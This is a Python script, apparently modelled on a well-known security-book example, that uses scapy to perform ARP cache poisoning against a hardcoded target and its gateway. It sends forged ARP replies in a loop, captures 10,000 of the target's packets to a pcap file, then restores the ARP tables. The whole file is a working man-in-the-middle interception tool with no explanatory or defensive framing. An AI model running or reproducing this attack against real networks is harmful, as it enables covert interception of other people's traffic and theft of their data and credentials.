#!/usr/bin/env python3
import os
import sys
import threading
import signal
import scapy.all


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Restoring target...")
    scapy.all.send(scapy.all.ARP(op=1, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)

    scapy.all.send(scapy.all.ARP(op=1, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)


def get_mac(ip_address):
    response, unanswerd = scapy.all.srp(scapy.all.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.all.ARP(pdst=ip_address), timeout=2, retry=10)

    for r, s in response:
        return r[scapy.all.Ether].src

    return None


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac, stop_event):
    poison_target = scapy.all.ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = scapy.all.ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("[*] Beginning the ARP poison. [CTRL-C to stop]")

    while True:
        scapy.all.send(poison_target)
        scapy.all.send(poison_gateway)

        if stop_event.wait(1):
            break

        print("Sent ARP poison packet.")

    print("[*] ARP posiona attack finished.")

    return None


interface = "eth0"
interface = "enp4s0"
target_ip = "172.29.156.105"
gateway_ip = "172.29.156.1"
packet_count = 10000

scapy.all.conf.iface = interface
scapy.all.conf.verb = 0

print("[*] Setting up {0}".format(interface))

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print("[!!!] Failed to get gateway MAC. Exiting.")
    sys.exit(1)

else:
    print("[*] Gateway {0} is at {1}".format(gateway_ip, gateway_mac))

target_mac = get_mac(target_ip)

if target_mac is None:
    print("[!!!] Failed to get target MAC. Exiting.")
    sys.exit(1)

else:
    print("[*] Target {0} is at {1}".format(target_ip, target_mac))

stop_event = threading.Event()
poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac, stop_event))
poison_thread.start()

print("[*] Starting sniffer for {0} packets".format(packet_count))

bpf_filter = "ip host {0}".format(target_ip)
packets = scapy.all.sniff(count=packet_count, filter=bpf_filter, iface=interface)

scapy.all.wrpcap("arper.pcap", packets)

stop_event.set()
poison_thread.join()

restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
